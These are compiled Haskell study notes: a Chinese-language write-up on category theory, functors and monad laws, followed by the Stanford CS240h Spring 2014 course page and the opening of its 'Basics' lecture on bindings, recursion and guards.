   .. rubric:: ` <#Haskell与范畴论>`__ Haskell与范畴论
      :name: Haskell与范畴论

      Haskell 中的函子、单子等都与范畴论（category theory）有很多联系，
      所以打算简单了解一下范畴论的相关内容。

         **范畴论** 是数学的一门学科，以抽象的方法处理数学概念，将这些概念形式化成一组组的“物件”及“态射”。
         数学中许多重要的领域可以形式化为范畴。使用范畴论可以令这些领域中许多难理解、难捉摸的数学结论更容易叙述证明。

         ———— 维基百科

      .. rubric:: ` <#范畴（Category）>`__ 范畴（Category）
         :name: 范畴（Category）

      范畴本质上是一个简单的集合，一个范畴  C  包含三个组成成分：

      -  一个类 ob(C)：其中元素称为 **对象（objects）**
      -  一个类 hom(C)：其中元素称为 **态射（morphisms）** （或 **箭号（arrows）** ）：
         每个态射连接了两个对象：源对象（source object）、目标对象（target object）。
         如果 𝑓 是从源对象 A 到目标对象 B (A, B ∈ ob(C) 的态射，那么记为 𝑓: A -> B
      -  一个二元运算，称为态射 **复合（composition）** ：
         两个态射 g: A -> B、f: B -> C 的复合记为 f∘g : A -> C
         Haskell 和大部分数学理论中都是从右向左计算，即 f∘g 中是先计算 g: A -> B 再计算 f: B -> C

      许多东西都可以组成范畴。比如:

      *  $\\mathbf{Set}$是一个范畴，对象为所有集合，态射为集合之间的函数，复合即函数之间的复合
      
      | *   $\\mathbf{Grp}$是一个范畴，对象为所有群，态射为群同态（group
           homomorphisms），例如对于群$(G,\*)$和$(H,\\cdot
        )$，有群同态$h : (G,\*)\\to (H,\\cdot
        )$，则需要对于$G$中的任意元素$u,v$满足
      | $$h(u*v)=h(u)\\cdot h(v)$$

      **注意** ：态射不必须为函数；而且可以存在源对象和目标对象都相同的不同态射

      .. rubric:: ` <#范畴公理>`__ 范畴公理
         :name: 范畴公理

      每个范畴都需要满足三条定律：

      #. 态射复合需要满足 **结合律（associativity）** ：
      
         $$f\\circ (g\\circ h) = (f\\circ g)\\circ h$$

      #. 范畴在复合操作下是 **闭合的（closed）** ：
         *  如果范畴 C 中存在态射$f : B\\to C$、$g : A\\to B$，那么范畴 C 中也一定存在态射$h
         : A\\to C$，且$h=f\\circ g$
      #. 每个对象都需要有 **单位态射（identity morphisms）** ：
         *  对于范畴 C 中的对象$A$，一定存在单位态射$\\mathrm{id}_A
            : A\\to A$，且对于每个态射$g : A\\to B$，一定有：
         $$g\\circ\\mathrm{id}_A = \\mathrm{id}_B\\circ g =
         g$$

      .. rubric:: ` <#mathbf-Hask-范畴>`__ $\\mathbf{Hask}$范畴
         :name: mathbf-Hask-范畴

      范畴$\\mathbf{Hask}$的对象为Haskell中的类型（types），态射是Haskell中的函数，复合运算是 ``(.)`` 。即从类型A到类型B的函数
      f :: A -> B
      就是$\\mathbf{Hask}$范畴中的一个态射。而函数 f :: B ->
      C 、g :: A -> B 的组合 f . g 就是一个新的函数 h :: A
      -> C。

      对于三条定律：

      #. 第一条显然满足：f . (g . h) = (f . g) . h

      #. 第二条也显然满足，如果有函数 f :: B -> C 、g :: A
         -> B，一定有函数 h = (f . g) :: A -> C

      #. 对于第三条定律，Haskell中存在单位函数 id
         ，但id是多态（polymorphic）的，要为其指定类型使其变成单态（monomorphic）的。比如态射$\\mathrm{id}_A$在Haskell中就可以表示为
         id :: A -> A。并且显然满足第三条定律（其中 f :: A
         -> B）：

         (id :: B -> B) . f = f . (id :: A -> A) = f

      .. rubric:: ` <#函子（Functors）>`__ 函子（Functors）
         :name: 函子（Functors）

      一个范畴中的态射将两个对象联系起来，而函子则会将两个范畴联系起来。换句话说，函子就是从一个范畴到另一个范畴的变换。比如对于范畴 C 、$\\mathbf{D}$，定义函子$F
      : \\mathbf{C}\\to\\mathbf{D}$满足：

      -  对于 C 中的任意对象$A$，在$\\mathbf{D}$中都有对象$F(A)$
      -  对于 C 中的任意态射$f : A\\to
         B$，在$\\mathbf{D}$中都有态射$F(f) : F(A)\\to F(B)$

      比如：

      *  遗忘函子（forgetful functor）$U :
         \\mathbf{Grp}\\to\\mathbf{Set}$，将一个群映射到一个集合中，将群同态映射到集合间的函数

      *  幂集函子（power set functor）$P :
         \\mathbf{Set}\\to\\mathbf{Set}$，将一个集合映射到它的幂集，将原集合中的函数$f
         : A\\to B$映射到函数$P(f) :
         \\mathcal{P}(A)\\to\\mathcal{P}(B)$，即从$U\\subseteq
         A$到值域$f(U)\\subseteq B$的映射

      *  自函子（endofunctor）$1\_{\\mathbf{C}} :
         \\mathbf{C}\\to\\mathbf{C}$，将一个范畴映射到它本身

      .. rubric:: ` <#函子公理>`__ 函子公理
         :name: 函子公理

      函子$F :
      \\mathbf{C}\\to\\mathbf{D}$也需要满足两个公理：

      #. 对于任意对象$X\\in\\mathbf{C}$，恒有$F(\\mathrm{id}_X)=\\mathrm{id}\_{F(X)}$
      #. 对于态射$f : Y\\to Z$、$g : X\\to
         Y$，恒有$F(f\\circ g) = F(f)\\circ F(g)$

      .. rubric:: ` <#mathbf-Hask-范畴上的函子>`__ $\\mathbf{Hask}$范畴上的函子
         :name: mathbf-Hask-范畴上的函子

      Haskell中的Functor定义是：

      .. container:: float highlight haskell
      ::

         class Functor (f :: * -> *) where 
             fmap :: (a -> b) -> f a -> f b

      对于Haskell中的Functor，它实际上是从$\\mathbf{Hask}$范畴（types）到它子范畴的变换。比如列表函子$\\mathtt{[]}
      :
      \\mathbf{Hask}\\to\\mathbf{Lst}$（其中$\\mathbf{Lst}$是所有Haskell中列表类型构成的范畴）

      它也达成了范畴论中对于函子的要求。函子需要进行两个操作：将一个范畴中的对象映射到另一个范畴中、将一个范畴中的态射映射到另一个范畴中。以Maybe为例，它实现了函子的要求：

      #. Maybe是一个类型构造器，他可以将任意类型 T
         变成新类型 Maybe
         T，相当于从$\\mathbf{Hask}$范畴的对象变成了$\\mathbf{Maybe}$范畴的对象
      #. fmap函数接收一个 a -> b 类型的函数，返回一个 Maybe
         a -> Maybe b
         类型的函数，相当于将$\\mathbf{Hask}$范畴中的态射$f
         : A\\to
         B$映射成了$\\mathbf{Maybe}$范畴中的态射$\\mathbf{Maybe}(f)
         : \\mathbf{Maybe}(A)\\to\\mathbf{Maybe}(B)$

      **注意** ：时刻记住这里研究的是$\\mathbf{Hask}$范畴和它的子范畴，对象是类型而不是值，态射是函数也指的是从类型到类型

      同时，Haskell中的Functor也满足函子公理：

      #. fmap id = id 即 fmap (id :: A -> A) = (id :: f A ->
         f A)
      #. fmap (f . g) = fmap f . fmap g

      .. rubric:: ` <#单子（Monads）>`__ 单子（Monads）
         :name: 单子（Monads）

         一个单子说白了不过就是自函子范畴上的一个幺半群而已
         \_(:з」∠)\_

      自函子在前面说到过是从一个范畴到自身的一个函子，如范畴 C 上的自函子是$F
      :
      \\mathbf{C}\\to\\mathbf{C}$。自函子范畴就是对象都是自函子的范畴。幺半群和Haskell中学到的Monoid类型类一样，是一个有可结合二元运算和单位元的代数结构。因此单子就是一个自函子，而且它有可结合二元运算（Haskell中 ``>=>`` ）和单位元（Haskell中 ``return`` ）。

      一个单子$M :
      \\mathbf{C}\\to\\mathbf{C}$还包含两个态射（对于范畴 C 中的所有对象$X$）：

      #. $\\mathrm{unit}_X^M : X\\to M(X)$
      #. $\\mathrm{join}_X^M : M(M(X))\\to M(X)$

      （当式子中的单子明显是$M$时，可以省略上标${}^M$）

      Haskell中Monad的定义是：

      .. container:: float highlight haskell
      ::

         class Functor m => Monad m where 
             return :: a -> m a 
             (>>=)  :: m a -> (a -> m b) -> m b

      其中很显然多态函数 ``return`` 对应了定义中的$\\mathrm{unit}$，但是 ``>>=`` 和$mathrm{join}$的对应关系并不明显。因此Haskell中有一个工具函数 ``join`` ，它的效果就是定义中的$\\mathrm{join}$，而且它可以和 ``>>=`` 互相定义：

      .. container:: float highlight haskell
      ::

         join :: Monad m => m (m a) -> m a
         join x = x >>= id

         (>>=) :: m a -> (a -> m b) -> m b 
         x >>= f = join $ fmap f x

      所以Haskell中为Monad要求定义 ``>>=`` 就相当于定义了$\\mathrm{join}$

      例如，幂集函子$P :
      \\mathbf{Set}\\to\\mathbf{Set}$也是一个单子，可以为它定义$\\mathrm{unit}$和$\\mathrm{join}$两个态射。Haskell中的列表也可以近似看作幂集函子。

      *  态射/函数的类型：
      
      .. list-table::
         :header-rows: 1

         - 

            - 幂集函子
            - Haskell中列表
         - 

            - 一个集合$S$和一个态射$f : A\\to B$
            - 一个类型 T 和一个函数 f :: A -> B
         - 

            - $P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)$
            - fmap f :: [A] -> [B]
         - 

            - $\\mathrm{unit}_S : S\\to\\mathcal{P}(S)$
            - return :: T -> [T]
         - 

            - $\\mathrm{join}_S :
               \\mathcal{P}(\\mathcal{P}(S))\\to\\mathcal{P}(S)$
            - join :: [[T]] -> [T]

      *  态射/函数的定义：
      
      .. list-table::
         :header-rows: 1

         - 

            - 幂集函子
            - Haskell中列表
         - 

            - $(\\mathcal{P}(f))(S) = \\{f(a):a\\in S\\}$
            - fmap f xs = [ f a \| a <- xs ]
         - 

            - $\\mathrm{unit}_S(x) = \\{x\\}$
            - return x = [x]
         - 

            - $\\mathrm{join}_S(L) = \\bigcup L$
            - join xs = concat xs

      .. rubric:: ` <#单子公理>`__ 单子公理
         :name: 单子公理

      给定一个单子$M :
      \\mathbf{C}\\to\\mathbf{C}$，和一个态射$f : A\\to
      B$（其中$A,B\\in
      \\mathbf{C}$），那么满足下面四条定律：

      #. $\\mathrm{join}\\circ
         M(\\mathrm{join})=\\mathrm{join}\\circ\\mathrm{join}$
      #. $\\mathrm{join}\\circ
         M(\\mathrm{unit})=\\mathrm{join}\\circ\\mathrm{unit}=\\mathrm{id}$
      #. $\\mathrm{unit}\\circ f = M(f)\\circ\\mathrm{unit}$
      #. $\\mathrm{join}\\circ M(M(f)) =
         M(f)\\circ\\mathrm{join}$

      也可以很自然地将其转化为Haskell中的表述：

      #. join . fmap join ``=`` join . join
      #. join . fmap return ``=`` join . return ``=`` id
      #. return . f ``=`` fmap f . return
      #. join . fmap (fmap f) ``=`` fmap f . join

      在Haskell中，使用 ``>>=`` 也有三个定律和这四个定律是等价的：

      #. return x >>= f ``=`` f x

         .. container:: float highlight haskell
         ::

              return x >>= f 
            = join (fmap f (return x)) = join (fmap f . return $ x)
            = join (return (f x)) = join (return . f $ x)
            = join . return $ (f x)
            = id (f x)
            = f x

      #. m >>= return ``=`` m

         .. container:: float highlight haskell
         ::

              m >>= return 
            = join (fmap return m) = join . fmap return $ m 
            = id m
            = m 

      #. (m >>= f) >>= g ``=`` m >>= (\\x -> f x >>= g)

         .. container:: float highlight haskell
         ::

              (m >>= f) >>= g 
            = (join (fmap f m)) >>= g = join (fmap g (join (fmap f m)))
            = join . fmap g . join $ fmap f m 
            = join . join . fmap (fmap g) $ fmap f m 
            = join . join . fmap (fmap g) . fmap f $ m 
            = join . join . fmap (fmap g . f) $ m 
            = join . fmap join . fmap (fmap g . f) $ m 
            = join . fmap (join . (fmap g . f)) $ m 
            = join . fmap (\x -> join (fmap g (f x))) $ m 
            = join . fmap (\x -> f x >>= g) $ m 
            = join (fmap (\x -> f x >>= g) m)
            = m >>= (\x -> f x >>= g)

      有关do语句和 ``>=>`` 的公理表述在上文中已经说过

   .. rubric:: ` <#后记>`__ 后记
      :name: 后记

      啃了将近一个月，算是把 Haskell 的主要内容都啃完了。主要就是前期看
      `Learn You a Haskell <http://learnyouahaskell.com/chapters>`__，
      后期看 `Typeclassopedia <https://wiki.haskell.org/Typeclassopedia>`__。

      后面的部分的理解感觉也没到位，Category（范畴）、Arrow 等这些类型类也就是大致地看了一眼，
      甚至有什么用都不太清楚\_(:з」∠)\_

      感觉 Haskell 这门语言确实很神奇，很多语法都很有意思，而且可以做到非常贴近数学、贴近数学概念。
      学的时候也是越学坑越多，先是函数式编程引申到了lambda演算，然后是函子等一系列概念引申到了范畴论，
      目前范畴论简单地看了一部分，lambda演算也没深入研究，以后有时间再说了（咕咕咕）

      现在感觉我学到的 Haskell 简直是皮毛，还有一堆源码里的东西不知道是怎么回事（包括但不限于#，~），
      也还有一堆类型类和用法没有学到（包括但不限于 Monad
      Transformer、Writer、Reader、State、Comonad、MonadFix、Lens、Parsec、……）
      [STRIKEOUT:md，这么一看差的还真多]，以后有时间再慢慢学了，这个假期还有好多其它事要干呢，
      Haskell这边先摸了\_(:з」∠)\_


   .. rubric:: ` <#Reference>`__ Reference
      :name: Reference

      -  `Learn You a Haskell <http://learnyouahaskell.com/chapters>`__
      -  `Writing foldl using foldr - StackOverflow <https://stackoverflow.com/questions/6172004/writing-foldl-using-foldr>`__
      -  `Haskell：用foldr定义foldl <https://blog.csdn.net/WinterShiver/article/details/103308165>`__
      -  `Typeclassopedia - Haskell wiki <https://wiki.haskell.org/Typeclassopedia>`__
      -  `Hoogle <https://hoogle.haskell.org/>`__
      -  `Functors, Applicatives, And Monads In Pictures <https://adit.io/posts/2013-04-17-functors,_applicatives,_and_monads_in_pictures.html>`__
      -  `Haskell学习 - functor <http://02s949.coding-pages.com/2018/08/15/haskellc/>`__
      -  `Haskell语言学习笔记（8）Monoid - zwvista <https://blog.csdn.net/zwvista/article/details/54863519>`__
      -  `Haskell语言学习笔记（16）Alternative - zwvista <https://blog.csdn.net/zwvista/article/details/62238541>`__
      -  `Haskell语言学习笔记（40）Arrow（1） - zwvista <https://blog.csdn.net/zwvista/article/details/78679542>`__
      -  `24 Days of GHC Extensions: Arrows - Tom Ellis <https://ocharles.org.uk/blog/guest-posts/2014-12-21-arrows.html>`__
      -  `Haskell语言学习笔记（47）Arrow（2） - zwvista <https://blog.csdn.net/zwvista/article/details/78690485>`__
      -  `Haskell/Category theory - wikibooks <https://en.wikibooks.org/wiki/Haskell/Category_theory>`__
      -  `Category theory - wikipedia <https://en.wikipedia.org/wiki/Category_theory>`__
      -  `范畴论 - 维基百科 <https://zh.wikipedia.org/wiki/%E8%8C%83%E7%95%B4%E8%AE%BA>`__
      -  `Monad (category theory) - wikipedia <https://en.wikipedia.org/wiki/Monad_(category_theory)>`__
      -  `Functor - wikipedia <https://en.wikipedia.org/wiki/Functor>`__

      "The End?"



===================================================
/. 🚀 CS240h: Functional Systems in Haskell
===================================================
- https://www.scs.stanford.edu/14sp-cs240h/

.. container:: row col-md-12

   .. rubric:: CS240h: Functional Systems in Haskell |CS240h|
      :name: title
      :class: text-hide text-center

   .. rubric:: Stanford CS240h Spring 2014
      :name: stanford-cs240h-spring-2014
      :class: lead text-center

If you have enrolled in the class or plan to, please install the
`Haskell Platform <http://hackage.haskell.org/platform/>`__ on your
machine so as to be able to do the assignments, and bring your laptop to
class.

.. container:: row col-md-12 alert alert-warning

   Final project presentations took place Thursday, June 5, 12pm-4pm in
   Gates 104. Lunch was served.

   Final project write-ups are available `here <projects/index.html>`__.

.. container:: row col-md-12 alert alert-warning

   If you are scribing a lecture, please see the 
   `scribe repo <https://github.com/scslab/cs240h-notes>`__ for information on
   how to prepare and submit the notes.

   Last day to submit scribe notes: June 14.

.. container:: row

   .. container:: col-md-4 col-md-offset-1

      .. container:: panel-heading

         Course Material

      .. container:: panel-body

         *  `Syllabus <https://www.scs.stanford.edu/14sp-cs240h/sched/>`__
         *  `Lecture slides <https://www.scs.stanford.edu/14sp-cs240h/slides/>`__
         *  `Scribed lecture notes <https://www.scs.stanford.edu/14sp-cs240h/notes/>`__
         *  `Lab 1 <https://www.scs.stanford.edu/14sp-cs240h/labs/lab1.html>`__
         *  `Lab 2 <https://www.scs.stanford.edu/14sp-cs240h/labs/lab2.html>`__
         *  `Lab 3 <https://www.scs.stanford.edu/14sp-cs240h/labs/lab3.html>`__
         *  `Project suggestions <https://www.scs.stanford.edu/14sp-cs240h/labs/project.html>`__

      .. container:: section panel panel-info

         .. container:: panel-heading

            Grading

         .. container:: panel-body

            **Grading:** Lab 1 (10%), Lab 2 (10%), Lab 3 (15%), Project
            (65%). **Late Days:** Each student gets 48 hours of
            extension to the lab deadlines that can be used in 24 hour
            blocks. They are used automatically. **Late Penalty:** Each
            day late (after late days exhausted) will reduce your
            maximum mark for the lab or project by 25%.

   .. container:: col-md-6

      .. container:: section panel panel-info

         .. container:: panel-heading

            Meetings

         .. container:: panel-body

            **Lecture:** Tuesdays and Thursdays, 12:50-2:05pm,
            `Gates <http://campus-map.stanford.edu/index.cfm?ID=07-450>`__
            B-12

      .. container:: section panel panel-info

         .. container:: panel-heading

            Resources

         .. container:: panel-body

            **Discussion forums:**
            `Piazza <https://piazza.com/stanford/spring2014/cs240h>`__
            **Class list:** cs240h-spr1314-students@lists.stanford.edu
            **Staff list:** |staff email| **Lab submission:** 
            `cs240h lab submission <http://upload.ghc.io>`__ **Recommended
            background:** `Real World Haskell <http://book.realworldhaskell.org/>`__, 
            by O'Sullivan, Stewart, and Goerzen.

            For help, please post on Piazza as then the whole class can
            benefit from your question. However, you can also email the
            class mailing list or staff mailing list if you prefer not
            to use Piazza

      .. container:: section panel panel-info

         .. container:: panel-heading

            Staff

         .. container:: panel-body

            .. container:: row

               **Instructor:** `David Mazières <http://www.scs.stanford.edu/~dm/>`__
               **Office hours:** Thursdays 2:05-3:05pm **Address:**
               Gates, Room 290 **Phone:** (415) 490-9451
               **Instructor:** `Bryan O'Sullivan <http://www.serpentine.com/>`__ **Office
               hours:** Tuesdays 2:05-3:00pm
               **Address:** Gates Hall, Room 288 **Email:**
               bos@serpentine.com
               **TA:** `David Terei <http://www.scs.stanford.edu/~davidt/>`__ **Office
               hours:** Monday 2:00-4:00pm **Address:** Gates, Room 288
               **Phone:** (415) 359-5494


CS240h lecture notes
=============================

#. `Basics <https://www.scs.stanford.edu/14sp-cs240h/slides/basics.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/basics-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/basics.md>`__]
#. Slides from previous lecture include this lecture
#. `Testing <https://www.scs.stanford.edu/14sp-cs240h/slides/testing.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/testing-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/testing.md>`__]
#. `Concurrency <https://www.scs.stanford.edu/14sp-cs240h/slides/concurrency.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/concurrency-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/concurrency.md>`__]
#. `Phantoms <https://www.scs.stanford.edu/14sp-cs240h/slides/phantoms.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/phantoms-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/phantoms.md>`__]
#. `Memory <https://www.scs.stanford.edu/14sp-cs240h/slides/memory.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/memory-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/memory.md>`__]
#. `Language extensions <https://www.scs.stanford.edu/14sp-cs240h/slides/extensions.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/extensions-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/extensions.md>`__]
#. `Generic programming <https://www.scs.stanford.edu/14sp-cs240h/slides/generic.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/generic-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/generic.md>`__]
#. `Monads and more <https://www.scs.stanford.edu/14sp-cs240h/slides/functors-monads.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/functors-monads-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/functors-monads.md>`__]
#. `Pipes <https://www.scs.stanford.edu/14sp-cs240h/slides/pipes.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/pipes-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/pipes.md>`__]
#. `Parsing and monads <https://www.scs.stanford.edu/14sp-cs240h/slides/parsing.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/parsing-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/parsing.md>`__]
#. `Information flow control <https://www.scs.stanford.edu/14sp-cs240h/slides/ifc.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/ifc-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/ifc.md>`__]
#. `Lenses <https://www.scs.stanford.edu/14sp-cs240h/slides/lenses.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/lenses-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/lenses.md>`__]
#. `Web <https://www.scs.stanford.edu/14sp-cs240h/slides/web.html>`__ [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/web-slides.html>`__,
   `source <https://www.scs.stanford.edu/14sp-cs240h/slides/web.md>`__]
#. `Haskell Compiler (compiler) <https://www.scs.stanford.edu/14sp-cs240h/slides/ghc-compiler.html>`__
   [`slides <https://www.scs.stanford.edu/14sp-cs240h/slides/ghc-compiler-slides.html>`__, `source <https://www.scs.stanford.edu/14sp-cs240h/slides/ghc-compiler.md>`__]
#. `Haskell Compiler (rts) <https://www.scs.stanford.edu/14sp-cs240h/slides/ghc-rts.pdf>`__

These slides were formatted using 
`pandoc <http://johnmacfarlane.net/pandoc/>`__. To install pandoc, run:

   ::

      cabal install pandoc -fhighlighting-kate

Slides were prepared with 

   ``pandoc slidy-url=`` *slidy-dir* ``--self-contained -s -t slidy -o``
   *outfile infile*

with this contents in `slidy-dir <slidy.tgz>`__ (we just modified
`slidy.css <slidy.css>`__ slightly).

--------------

.. container::

   Permission hereby granted for anyone to copy, modify, and
   redistribute any lecture note material from this class that belongs
   to the instructors or Stanford.

/L1 Basics
==========

CS240h: Functional systems in Haskell 

-  I’m David Mazières

   -  Spent most of my career working on OSes, Systems, and Security
   -  Previously used C++ and C, but started using Haskell 5 years ago
   -  Course partly inspired by my experience learning Haskell

-  Other instructor: Bryan O’Sullivan

   -  Has implemented many key Haskell libraries in widespread use today
   -  Co-wrote `Real World Haskell <http://book.realworldhaskell.org/>`__, a great
      non-theoretical intro book
   -  Also plenty of systems experience (e.g., Linux early userspace code)

-  Course assistant: David Terei

   -  Member of the Haskell standards committee!
   -  Implemented `Safe Haskell <http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html>`__
      and GHC LLVM backend

Why Haskell?
============

-  Haskell’s expressive power can improve productivity

   -  Small language core provides big flexibility
   -  Code can be very concise, speeding development
   -  Get best of both worlds from compiled and interpreted languages

-  Haskell makes code easier to understand and maintain

   -  Can dive into complex libraries and understand *what* the code is
      doing (*why* may be a different story, but conciseness leaves room
      for comments…)

-  Haskell can increase the robustness of systems

   -  Strong typing catches many bugs at compile time
   -  Functional code permits better testing methodologies
   -  Can parallelize non-concurrent code without changing semantics
   -  Concurrent programming abstractions resistant to data races

-  Haskell lets you realize new types of functionality (DIFC, STM, …)

Why take CS240h?
================

-  Learn to build systems in Haskell with reduced upfront cost

   -  Historically, Haskell was a vehicle for language research. The
      history is reflected in how the language is usually taught
   -  CS240h will present the language more from a systems perspective

-  Learn new, surprising, and effective programming techniques

   -  Some are applicable to other languages (though returning to other
      languages after Haskell can be frustrating)

-  **You enjoy programming**

   -  With Haskell, you will think about programming in new ways

-  You sometimes get frustrated with other languages

   -  Maybe you’ve wanted to design a new language, or tend to “max-out”
      existing language features (macros, templates, overloading, etc.)
   -  Things that require changes to most languages can be done in a
      library with Haskell

Administrivia
=============

-  We assume some of you may have toyed with Haskell, others not
-  First week cover Haskell basics

   -  If you haven’t used Haskell, you should supplement by reading
      parts of `Bryan’s book <http://book.realworldhaskell.org/>`__
      and/or on-line tutorials (such as http://www.haskell.org/tutorial/
      or http://learnyouahaskell.com/chapters).
   -  If you have used Haskell, you may still learn some things from
      these lectures

-  Rest of term covers more advanced techniques
-  Final grade will be based on several factors

   1. Class attendance and participation **– bring your laptop to class**
   2. Scribing one of the lectures **– need a volunteer for today**

      -  We plan to collect all the notes and distribute them freely on web

   3. Three small warm-up solo programming exercises
   4. A large final project & presentation

Final project
=============

-  Implement a project of your choice in Haskell

   -  Projects may be done in teams of 1-3 people
   -  Meet with one of the instructors to discuss project
   -  Complete and evaluate project and turn in short paper
   -  Final exam will be mini-conference where you present your work
   -  **Attending exam Tuesday, June 10th, 7:00pm-10:00pm is
      mandatory**  But by unanimous consent we could move this to
      Thursday June 5, 12:15-3:15pm. (And we would serve lunch…)

.. raw:: html

   <!--
   * Class home page has list of
     [suggested projects](http://cs240h.scs.stanford.edu/labs/project.html)
     (we will add more)
   -->

-  We encourage overlap of CS240h project with your research

   -  The programming techniques you learn in CS240h are likely
      orthogonal to whatever research you are doing

-  We are okay with CS240h project also serving as another class
   project, **provided the other instructor and all teammates (from
   both classes) approve**

Getting started with Haskell
============================

-  Install `Haskell Platform <http://hackage.haskell.org/platform/>`__
   or ```cabal`` <http://www.haskell.org/cabal/users-guide/>`__
   (sometimes ``cabal-install``) +
   `GHC <http://www.haskell.org/ghc/docs/latest/html/users_guide/index.html>`__

-  Create a file called ``hello.hs`` with the following contents:

   .. code:: haskell

      main = putStrLn "Hello, world!"

-  Compile your program to a native executable like this:

   ::

      $ ghc --make hello
      [1 of 1] Compiling Main             ( hello.hs, hello.o )
      Linking hello ...
      $ ./hello
      Hello, world!

-  Or run it in the `GHCI interpreter <http://www.haskell.org/ghc/docs/latest/html/users_guide/ghci.html>`__
   like this:

   ::

      $ ghci hello.hs 
      GHCi, version 7.6.3: http://www.haskell.org/ghc/  :? for help
      ...
      Ok, modules loaded: Main.
      *Main> main
      Hello, world!
      *Main> 

Bindings
========

-  Haskell uses the ``=`` sign to declare *bindings*:

   .. code:: haskell

      x = 2                   -- Two hyphens introduce a comment
      y = 3                   --    ...that continues to end of line.
      main = let z = x + y    -- let introduces local bindings
             in print z       -- program will print 5

   -  Bound names cannot start with upper-case letters
   -  Bindings are separated by “``;``”, which is usually auto-inserted
      by a
      `layout <http://www.haskell.org/onlinereport/haskell2010/haskellch2.html#x7-210002.7>`__
      rule

-  A binding may declare a *function* of one or more arguments

   -  Function and arguments are separated by spaces (when defining or
      invoking)

   .. code:: haskell

      add arg1 arg2 = arg1 + arg2   -- defines function add
      five = add 2 3                -- invokes function add

-  Parentheses can wrap compound expressions, must do so for arguments

   .. code:: haskell

      bad = print add 2 3     -- error! (print should have only 1 argument)

   .. code:: haskell

      main = print (add 2 3)  -- ok, calls print with 1 argument, 5

Haskell is a *pure* functional language
=======================================

-  Unlike variables in imperative languages, Haskell bindings are

   -  *immutable* - can only bind a symbol once in a give scope (bound
      symbols still called “variables” since function arguments can vary
      across invocations)

   .. code:: haskell

      x = 5
      x = 6                      -- error, cannot re-bind x

   -  *order-independent* - order of bindings in source code does not
      matter
   -  *lazy* - definitions of symbols are evaluated only when needed

   .. code:: haskell

      safeDiv x y =
          let q = div x y        -- safe as q never evaluated if y == 0
          in if y == 0 then 0 else q
      main = print (safeDiv 1 0) -- prints 0

   -  *recursive* - the bound symbol is in scope within its own
      definition

   .. code:: haskell

      x = 5                 -- this x is not used in main

      main = let x = x + 1  -- introduces new x, defined in terms of itself
             in print x     -- program "diverges" (i.e., loops forever)

How to program without mutable variables?
=========================================

-  In C, we use mutable variables to create loops:

   .. code:: C

      long
      factorial (int n)
      {
        long result = 1;
        while (n > 1)
          result *= n--;
        return result;
      }

-  In Haskell, use recursion to “re-bind” argument symbols in new scope

   .. code:: haskell

      factorial n = if n > 1
                    then n * factorial (n-1)
                    else 1

   -  Recursion often fills a similar need to mutable variables
   -  But the above Haskell factorial is inferior to the C one–why?

Tail recursion
==============

-  Each recursive call may require a stack frame

   -  This Haskell code requires ``n`` stack frames

      .. code:: haskell

         factorial n = if n > 1 then n * factorial (n-1) else 1

   -  By contrast, our C factorial ran in constant space

-  Fortunately, Haskell supports optimized *tail recursion*

   -  A function is tail recursive if it ends with a call to itself
   -  Unfortunately, ``factorial n`` multiplies by ``n`` *after*
      evaluating ``factorial (n-1)``

-  Idea: use *accumulator* argument to make calls tail recursive

   .. code:: haskell

      factorial n = let loop acc n' = if n' > 1
                                      then loop (acc * n') (n' - 1)
                                      else acc
                    in loop 1 n

   -  Here ``loop`` is tail recursive, compiles to an actual loop

Guards and ``where`` clauses
============================

-  *Guards* let you shorten function declarations:

   .. code:: haskell

      factorial n = let loop acc n' | n' > 1 = loop (acc * n') (n' - 1)
                                    | otherwise = acc
                    in loop 1 n

   -  “``|``” symbol introduces a guard
   -  Guards are evaluated top to bottom; the first ``True`` guard wins
   -  The system Prelude (standard library) defines ``otherwise = True``

-  Bindings can also end with ``where`` clauses–like inverted ``let``

   .. code:: haskell

      factorial n = loop 1 n
          where loop acc n' | n' > 1    = loop (acc * n') (n' - 1)
                            | otherwise = acc

   -  Unlike ``let``, a ``where`` clause scopes over multiple guarded
      definitions
   -  This is convenient for binding variables to use in guards

Tip: variable names
===================

-  Inner functions (``loop``) often have arguments related to outer
   function

   -  It is legal to re-use variable names already in scope, but
      compiler will warn you
   -  Typical practice is to add ``'`` (prime) to the inner-function’s
      argument
   -  Haskell accepts the ``'`` character in variables, except as first
      character

-  Personally, I find this practice a bit error-prone

   -  While learning Haskell, I repeatedly made the error of dropping
      primes, e.g.:

   .. code:: haskell

      factorial n = loop 1 n
          where loop acc n' | n' > 1    = loop (acc * n) (n' - 1) -- bug
                            | otherwise = acc

   -  You can avoid the problem by using the longer symbol name for the
      outer function (i.e., shorter name for shorter scope)

   .. code:: haskell

      factorial n0 = loop 1 n0
          where loop acc n | n > 1     = loop (acc * n) (n - 1)
                           | otherwise = acc

   -  Here accidentally typing “``factorial n0 = loop 1 n``” causes
      compile error

Every expression and binding has a type
